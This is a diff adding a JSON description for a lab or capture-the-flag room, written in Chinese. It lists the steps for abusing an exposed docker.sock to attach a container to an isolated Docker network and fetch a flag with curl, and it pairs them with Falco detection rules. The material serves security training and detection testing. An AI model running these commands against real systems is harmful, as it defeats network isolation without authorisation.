@@ -1,0 +1,27 @@
+{
+  "id": "room9",
+  "container": "room9",
+  "title": "Docker.sock 濫用繞過網路隔離",
+  "vuln_type": "docker-sock-exposure",
+  "exploit_script": "exploits/room9.sh",
+  "exploit_steps": [
+    "ping secret-server.internal（失敗，room9 預設不在 secret_net）",
+    "docker network ls、docker network inspect secret_net 找出目標網路名稱及 alias secret-server.internal",
+    "docker network connect secret_net room9（利用 docker.sock 權限將自己加入隔離網段）",
+    "curl http://secret-server.internal/ 與 curl http://secret-server.internal/hint（提示需帶 X-Token: room9_player）",
+    "curl -H 'X-Token: room9_player' http://secret-server.internal/secret 取得 FLAG"
+  ],
+  "expected_outcome": "透過 docker.sock 權限執行 docker network connect，使原本網路隔離（internal: true 的 secret_net）失效，成功存取並透過已知 token 取得 secret-server 上的 FLAG",
+  "falco_rule_refs": [
+    "docker_sock_write_access",
+    "docker_network_connect_api",
+    "network_interface_added",
+    "internal_network_access"
+  ],
+  "falco_relevant_behaviors": [
+    "對 /var/run/docker.sock 的寫入請求（POST /networks/<id>/connect）",
+    "容器網路介面動態變化（room9 新增一個連到 secret_net 的 interface）",
+    "對 secret-server.internal（172.22.x.x，secret_net 子網）的新出站連線",
+    "HTTP 請求帶有自訂 X-Token header 存取 /secret 路徑"
+  ]
+}
